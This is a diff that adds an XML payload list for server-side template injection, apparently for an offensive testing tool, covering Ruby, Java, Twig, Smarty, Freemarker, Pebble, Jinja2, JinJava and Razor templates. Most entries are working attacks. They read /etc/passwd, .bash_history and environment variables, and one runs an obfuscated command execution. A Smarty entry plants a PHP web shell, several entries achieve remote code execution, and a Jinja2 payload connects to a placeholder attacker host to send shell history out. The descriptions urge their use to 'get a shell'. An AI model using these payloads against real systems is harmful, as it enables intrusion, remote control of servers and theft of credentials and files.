@@ -1,0 +1,280 @@
+<?xml version="1.0"?>
+<ssti>
+	<attack>
+		<name>Ruby Basic ERB</name>
+		<code>&lt;%= 7 * 7 %&gt;</code>
+
+		<desc>No Description Yet</desc>
+		<label>Basic Ruby Injection</label>
+
+	</attack>
+	<attack>
+		<name>Ruby Basic Slim</name>
+		<code>#{ 7 * 7 }</code>
+
+		<desc>No Description Yet</desc>
+		<label>Basic Ruby Injection</label>
+
+	</attack>
+	<attack>
+		<name>Ruby Read Files</name>
+		<code>&lt;%= File.open(&apos;/etc/passwd&apos;).read %&gt;</code>
+
+		<desc>Change the file to other files that might host information. .bash_history and others are great targets.</desc>
+		<label>Ruby Injection</label>
+
+	</attack>
+	<attack>
+		<name>Ruby Read Files</name>
+		<code>&lt;%= Dir.entries(&apos;/&apos;) %&gt;</code>
+
+		<desc>Helps you to map out directories and files</desc>
+		<label>Ruby Injection</label>
+
+	</attack>
+	<attack>
+		<name>Java Basic 1</name>
+		<code>${7*7}</code>
+
+		<desc>No Description</desc>
+		<label>Java Injection</label>
+
+	</attack>
+	<attack>
+		<name>Java Basic 2</name>
+		<code>${{7*7}}</code>
+
+		<desc>No Description</desc>
+		<label>Java Injection</label>
+
+	</attack>
+	<attack>
+		<name>Java Basic getPath</name>
+		<code>${class.getResource(&quot;&quot;).getPath()}</code>
+
+		<desc>Location Path information</desc>
+		<label>Java Injection</label>
+
+	</attack>
+	<attack>
+		<name>Java Basic getContent</name>
+		<code>${class.getResource(&quot;../../../../../index.htm&quot;).getContent()}</code>
+
+		<desc>Gather content infomration</desc>
+		<label>Java Injection</label>
+
+	</attack>
+	<attack>
+		<name>Java Env Var</name>
+		<code>${T(java.lang.System).getenv()}</code>
+
+		<desc>Gather system's environmental Variables</desc>
+		<label>Java Injection</label>
+
+	</attack>
+	<attack>
+		<name>Java passwd 1</name>
+		<code>${T(java.lang.Runtime).getRuntime().exec(&apos;cat etc/passwd&apos;)}</code>
+
+		<desc>Retrieve /etc/passwd</desc>
+		<label>Java Injection</label>
+
+	</attack>
+	<attack>
+		<name>Java passwd 2</name>
+		<code>${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</code>
+
+		<desc>Retrieve /etc/passwd</desc>
+		<label>Java Injection</label>
+
+	</attack>
+	<attack>
+		<name>Twig Basic 1</name>
+		<code>{{7*7}}</code>
+
+		<desc>No Description</desc>
+		<label>Twig Injection</label>
+
+	</attack>
+	<attack>
+		<name>Twig Basic 2</name>
+		<code>{{7*&apos;7&apos;}}</code>
+
+		<desc>This would return 49 and would help to clarify that it is Twig</desc>
+		<label>Twig Injection</label>
+
+	</attack>
+	<attack>
+		<name>Twig File Read</name>
+		<code>&quot;{{&apos;/etc/passwd&apos;|file_excerpt(1,30)}}&quot;@</code>
+
+		<desc>Obviously change the file to whatever meets your need.</desc>
+		<label>Twig Injection</label>
+
+	</attack>
+	<attack>
+		<name>Smarty Version</name>
+		<code>{$smarty.version}</code>
+
+		<desc>Easy Check to see if there is SSTI and if it using Smarty</desc>
+		<label>Smarty Injection</label>
+
+	</attack>
+	<attack>
+		<name>Smarty C2</name>
+		<code>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt;&quot;,self::clearConfig())}</code>
+
+		<desc>Using SSTI to inject a php payload for command and control.</desc>
+		<label>Smarty Injection</label>
+
+	</attack>
+	<attack>
+		<name>Freemarker Basic 1</name>
+		<code>${3*3}</code>
+
+		<desc>This is a basic check to see if you have SSTI</desc>
+		<label>Freemarker Injection</label>
+
+	</attack>
+	<attack>
+		<name>Freemarker Basic 2</name>
+		<code>#{3*3}</code>
+
+		<desc>This is a basic check to see if you have SSTI for legacy Freemarker</desc>
+		<label>Freemarker Injection</label>
+
+	</attack>
+	<attack>
+		<name>Freemarker RCE 1</name>
+		<code>&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;${ ex(&quot;id&quot;)}</code>
+
+		<desc>If you get a result with the id command you can use this to get a shell... Maybe use the shell help section and create a custom shell for this.</desc>
+		<label>Freemarker Injection</label>
+
+	</attack>
+	<attack>
+		<name>Freemarker RCE 2</name>
+		<code>[#assign ex = &apos;freemarker.template.utility.Execute&apos;?new()]${ ex(&apos;id&apos;)}</code>
+
+		<desc>If you get a result with the id command you can use this to get a shell... Maybe use the shell help section and create a custom shell for this.</desc>
+		<label>Freemarker Injection</label>
+
+	</attack>
+	<attack>
+		<name>Freemarker RCE 3</name>
+		<code>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}</code>
+
+		<desc>If you get a result with the id command you can use this to get a shell... Maybe use the shell help section and create a custom shell for this.</desc>
+		<label>Freemarker Injection</label>
+
+	</attack>
+	<attack>
+		<name>Pebble Basic 1</name>
+		<code>{{ someString.toUPPERCASE() }}</code>
+
+		<desc>This is a basic check to see if you have SSTI for older pebble implmentations fixed in version 3.0.9 Spring 2019</desc>
+		<label>Pebble Injection</label>
+
+	</attack>
+	<attack>
+		<name>Pebble Basic 2</name>
+		<code>{{ (1).TYPE.forName(...) }}</code>
+
+		<desc>This is a basic check to see if you have SSTI for older pebble implmentations fixed in Summer of 2019</desc>
+		<label>Pebble Injection</label>
+
+	</attack>
+	<attack>
+		<name>Pebble RCE</name>
+		<code>{% set cmd = &apos;id&apos; %}
+{% set bytes = (1).TYPE
+     .forName(&apos;java.lang.Runtime&apos;)
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName(&apos;java.lang.String&apos;)
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}</code>
+
+		<desc>I have not tested this</desc>
+		<label>Pebble Injection</label>
+
+	</attack>
+	<attack>
+		<name>JinJa2 Basic 1</name>
+		<code>{{4*4}}  Or  [[5*5]]</code>
+
+		<desc>This is a basic check to see if you have SSTI</desc>
+		<label>JinJa2 Injection</label>
+
+	</attack>
+	<attack>
+		<name>JinJa2 Basic 2</name>
+		<code>{{7*&apos;7&apos;}}</code>
+
+		<desc>If this is JinJa2 then it would return 7777777 and not 49</desc>
+		<label>JinJa2 Injection</label>
+
+	</attack>
+	<attack>
+		<name>JinJa2 File Read</name>
+		<code>{{ &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() }}</code>
+
+		<desc>Change the file that you are wanting to read based on need.</desc>
+		<label>JinJa2 Injection</label>
+
+	</attack>
+	<attack>
+		<name>JinJa2 File Write</name>
+		<code>{{ &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/marantral.txt&apos;, &apos;w&apos;).write(&apos;Manrantral The ManTroll!!!&apos;) }</code>
+
+		<desc>If you have writing abilities in a web directory this would be an intresting payload.</desc>
+		<label>JinJa2 Injection</label>
+
+	</attack>
+	<attack>
+		<name>JinJa2 POpen Reverse Shell</name>
+		<code>{% for x in ().__class__.__base__.__subclasses__() %}{% if &quot;warning&quot; in x.__name__ %}{{x()._module.__builtins__[&apos;__import__&apos;](&apos;os&apos;).popen(&quot;python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;attack-ip\&quot;,attack-port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;.bash_history\&quot;]);&apos;&quot;).read().zfill(417)}}{%endif%}{% endfor %}</code>
+
+		<desc>You will obviously have to change the attack-ip and attack-port to what your lhost and lport are.</desc>
+		<label>JinJa2 Injection</label>
+
+	</attack>
+	<attack>
+		<name>JinJava Basic</name>
+		<code>{{&apos;a&apos;.toUpperCase()}}</code>
+
+		<desc>This would return an A if it is JinJava and it is vulnerable to SSTI.</desc>
+		<label>JinJava Injection</label>
+
+	</attack>
+	<attack>
+		<name>JinJava RCE</name>
+		<code>{{&apos;a&apos;.getClass().forName(&apos;javax.script.ScriptEngineManager&apos;).newInstance().getEngineByName(&apos;JavaScript&apos;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)}}</code>
+
+		<desc>If the command is successful then you can modify it to do what you want it to. I would recommend using the shell helper section.</desc>
+		<label>JinJava Injection</label>
+
+	</attack>
+	<attack>
+		<name>ASP .NET Razor</name>
+		<code>@(1+2)</code>
+
+		<desc>This should return 3 if it is vulnerable to SSTI</desc>
+		<label>ASP Injection</label>
+
+	</attack>
+	<attack>
+		<name>ASP .NET Razor RCE</name>
+		<code>@{
+  // C# code
+}</code>
+
+		<desc>I have not tested this.</desc>
+		<label>ASP Injection</label>
+
+	</attack>
+</ssti>
